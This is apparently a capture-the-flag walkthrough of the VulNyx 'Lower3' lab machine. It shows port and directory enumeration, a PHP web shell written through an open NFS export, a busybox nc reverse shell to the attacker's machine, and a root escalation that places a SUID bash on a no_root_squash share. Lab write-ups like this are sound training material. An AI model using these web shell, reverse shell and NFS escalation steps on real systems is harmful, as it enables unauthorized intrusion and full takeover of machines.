# VulNyx - Lower3

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.10
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 11:15 +07
Nmap scan report for 10.11.5.10
Host is up (0.0016s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp    open  http     Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37395/tcp   mountd
|   100005  1,2,3      45307/tcp6  mountd
|   100005  1,2,3      46932/udp6  mountd
|   100005  1,2,3      54637/udp   mountd
|   100021  1,3,4      40467/tcp6  nlockmgr
|   100021  1,3,4      44636/udp   nlockmgr
|   100021  1,3,4      46497/tcp   nlockmgr
|   100021  1,3,4      50438/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
37395/tcp open  mountd   1-3 (RPC #100005)
45465/tcp open  mountd   1-3 (RPC #100005)
46497/tcp open  nlockmgr 1-4 (RPC #100021)
56231/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 08:00:27:4E:FC:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.78 seconds
```
#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.10/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.10/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 275]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.10/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.10/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

### Shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ showmount -e 10.11.5.10                                        
Export list for 10.11.5.10:
/var/www/html *
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ sudo mount -t nfs 10.11.5.10:/var/www/html /tmp/nfs_exploit -o nolock

┌──(dungcngo㉿kali)-[/tmp]
└─$ cd nfs_exploit 
                                                                                   ┌──(dungcngo㉿kali)-[/tmp/nfs_exploit]
└─$ ls
index.html

┌──(dungcngo㉿kali)-[/tmp/nfs_exploit]
└─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
                                                                                   ┌──(dungcngo㉿kali)-[/tmp/nfs_exploit]
└─$ ls
index.html  shell.php
```
![web-exploit](/walkthroughs/vulnyx/low-difficulty/29_lower3/web-exploit.png)

```bash
┌──(dungcngo㉿kali)-[/tmp/nfs_exploit]
└─$ curl -sX GET "http://10.11.5.10/shell.php?cmd=busybox%20nc%2010.11.5.4%204444%20-e%20sh"
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.10] 35268
id;hostname
uid=1000(low) gid=1000(low) groups=1000(low)
lower3
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
low@lower3:/var/www/html$ 
```

### Privilege Escalation
#### Enumeration
```bash
low@lower3:/var/www/html$ cat /etc/exports
cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/www/html/       *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
#### Abuse
```bash
low@lower3:/var/www/html$ cp /usr/bin/bash .
cp /usr/bin/bash .
low@lower3:/var/www/html$ ls -la
ls -la
total 1232
drwxrwxrwx 2 low low    4096 May 17 19:52 .
drwxr-xr-x 3 low low    4096 Mar  9  2025 ..
-rwxr-xr-x 1 low low 1234376 May 17 19:52 bash
-rw------- 1 low low   10701 Jun 12  2023 index.html
-rw-rw-r-- 1 low low      31 May 17 18:09 shell.php
```

```bash
┌──(dungcngo㉿kali)-[/tmp/nfs_exploit]
└─$ sudo chown root:root bash    

┌──(dungcngo㉿kali)-[/tmp/nfs_exploit]
└─$ sudo chmod 4755 bash      

┌──(dungcngo㉿kali)-[/tmp/nfs_exploit]
└─$ ls -la
total 1228
drwxrwxrwx  2 dungcngo dungcngo    4096 May 18 00:52 .
drwxrwxrwt 14 root     root         400 May 18 10:09 ..
-rwxr-xr-x  1 root     root     1234376 May 18 00:52 bash
-rw-------  1 dungcngo dungcngo   10701 Jun 13  2023 index.html
-rw-rw-r--  1 dungcngo dungcngo      31 May 17 23:09 shell.php
```

```bash
low@lower3:/var/www/html$ ls -la
ls -la
total 1232
drwxrwxrwx 2 low  low     4096 May 17 19:52 .
drwxr-xr-x 3 low  low     4096 Mar  9  2025 ..
-rwsr-xr-x 1 root root 1234376 May 17 19:52 bash
-rw------- 1 low  low    10701 Jun 12  2023 index.html
-rw-rw-r-- 1 low  low       31 May 17 18:09 shell.php
low@lower3:/var/www/html$ ./bash -p
./bash -p
bash-5.1# id ; hostname
id ; hostname
uid=1000(low) gid=1000(low) euid=0(root) groups=1000(low)
lower3
```
#### Flags
```bash
bash-5.1# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
da0a4e93754fe6808c69909fe8c36a54
eed0bec06e4dc67b60d8bd762a843d75
```

***You are welcome!***
